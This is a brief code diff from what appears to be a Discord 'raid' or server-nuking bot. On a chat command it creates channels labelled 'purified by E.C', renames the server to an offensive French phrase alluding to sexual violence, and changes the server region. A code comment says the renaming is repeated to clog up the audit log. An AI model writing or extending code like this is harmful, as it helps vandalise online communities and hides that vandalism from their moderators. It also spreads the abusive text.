@@ -56,7 +56,7 @@ if(cmd("channel", msg)) {
           color: 'BLUE',
       });
       msg.guild.createChannel('purified by E.C', 'voice')
-      msg.guild.createChannel('purified by E.C', 'text').then(channel => message.guild.channel.get(channel).send("test"))
+      msg.guild.createChannel('purified by E.C', 'text')
       //changes name tons of times to clog up the audit log
       msg.guild.setName("LA EC A VIOLER TON PERE");
       msg.guild.setRegion('russia')
